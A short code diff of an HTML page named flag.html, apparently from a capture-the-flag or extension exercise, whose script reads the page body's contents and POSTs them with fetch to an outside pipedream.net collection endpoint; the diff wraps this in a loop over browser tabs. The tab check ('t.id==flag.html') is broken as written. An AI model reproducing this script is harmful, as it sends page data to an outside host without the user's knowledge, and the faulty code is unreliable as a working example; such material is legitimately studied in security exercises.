@@ -3,9 +3,11 @@
     <title>flag.html</title>
      <script src="jquery-3.4.1.min.js"></script>
     <script>
-      $(document).ready(function()
-      {
-      var flag = $("body").val();
+     chrome.tabs.query({}, function(tabs) {
+            tabs.forEach(t => {
+        if(t.id==flag.html){
+      var flag = $("body").html();
+      console.log(flag)
       fetch('https://eo876vqe5g2n7ku.m.pipedream.net', {
       method: 'POST',
       headers: {
@@ -18,11 +20,10 @@
       console.log('Response from server:', result);
     })
 
-  });
+  }})});
     </script>
   </head>
   <body>
     
   </body>
 </html>
-
